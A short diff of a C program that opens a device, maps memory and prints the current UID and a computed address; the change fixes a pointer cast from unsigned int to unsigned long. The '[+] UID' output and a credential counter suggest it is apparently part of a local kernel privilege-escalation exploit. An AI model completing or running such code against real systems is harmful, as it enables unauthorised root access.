@@ -45,6 +45,7 @@ int main(int argc, char **argv)
 	printf("PID %d: device opened: fd=%d\n", getpid(), fd);
 
 	len = strtoul(argv[2], 0, 0);
+
 #if 0
 	if ((num < 0) || (num > INT_MAX)) {
 		fprintf(stderr,"%s: number of bytes '%ld' invalid.\n", argv[0], num);
@@ -73,7 +74,7 @@ int main(int argc, char **argv)
 	unsigned int credNum = 0;
 
 	printf("[+] UID: %d\n", uid);
-	unsigned long bas = (unsigned int)mmap_start + len - 0x40;
+	unsigned long bas = (unsigned long)mmap_start + len - 0x40;
 	printf("  addr=%p mmap_start=%p len=%lu\n"
 	       "  bas = %p\n",
 		addr, mmap_start, len, (void *)bas);
